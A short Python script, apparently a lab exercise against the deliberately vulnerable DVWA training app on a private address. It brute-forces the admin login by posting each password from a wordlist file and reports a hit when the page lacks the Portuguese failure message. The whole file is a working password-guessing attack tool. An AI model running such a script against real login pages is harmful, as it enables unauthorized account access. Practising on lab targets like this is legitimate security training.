import requests
url = "http://10.0.0.139"
login_url = url+"/dvwa/login.php"
arquivo = "wordlist.txt"
usuario = "admin"
def request(username, password):
    data = {"user": username, "pass": password}
    r = requests.post(login_url, data=data)
    if "Logue novamente" in r.text:
        print("Nao foi possivel achar a senha!!")
    else:
        print("A senha e: "+username + " | "+ password)
wordlist = open(arquivo, "r")
for i in wordlist:
    print("Testando "+ usuario + " || " + i)
    request(usuario,i)
    print("===============================")
